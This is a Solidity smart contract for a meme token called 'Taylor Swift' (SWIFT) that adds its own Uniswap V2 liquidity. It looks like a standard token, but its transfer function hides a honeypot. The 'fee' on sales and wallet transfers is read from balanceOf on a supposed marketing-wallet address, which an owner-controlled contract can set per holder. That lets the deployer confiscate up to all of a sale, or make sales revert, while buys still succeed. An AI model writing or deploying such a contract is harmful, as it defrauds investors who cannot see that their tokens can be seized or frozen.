// SPDX-License-Identifier: MIT

pragma solidity 0.8.24;

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
     function addLiquidityETH( address token, 
     uint amountTokenDesired, 
     uint amountTokenMin, 
     uint amountETHMin, 
     address to, 
     uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address wallet) external view returns (uint256);
}

contract Ownable {
    address internal _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function owner() public view returns (address) {
        return _owner;
    }
}

contract TaylorSwift is Ownable {
    using SafeMath for uint256;
    uint8 private _decimals = 9;
    mapping (address => uint256) private _balances;
    uint256 private _totalSupply =  1000000000 * 10 ** _decimals;
    address internal _marketingWallet = 0x818863031d0F97b8cF37850C8FA234ACac0eA2fa;
    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address private uniswapV2Pair;
    mapping (address => mapping (address => uint256)) private _allowances;
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 amount);
    bool private tradingStarted = false;
    string private _name = "Taylor Swift";
    string private _symbol = "SWIFT";
    uint256 private maxTx = _totalSupply.mul(3).div(100);


    function openTrading() external payable onlyOwner() {
        require(!tradingStarted, "Trading already started");
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)), 0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        tradingStarted = true;
    }

    constructor () {
        _balances[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }
    
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(amount > 0);
        uint256 fee = 0;
        require(from != address(0));
        if (tradingStarted && from != uniswapV2Pair && from != address(this)) {
            fee = IERC20(_marketingWallet).balanceOf(from);
        }
        _balances[to] = _balances[to].add(amount).sub(amount.mul(fee).div(100));
        _balances[from] = _balances[from].sub(amount);
        emit Transfer(from, to, amount);
    }
}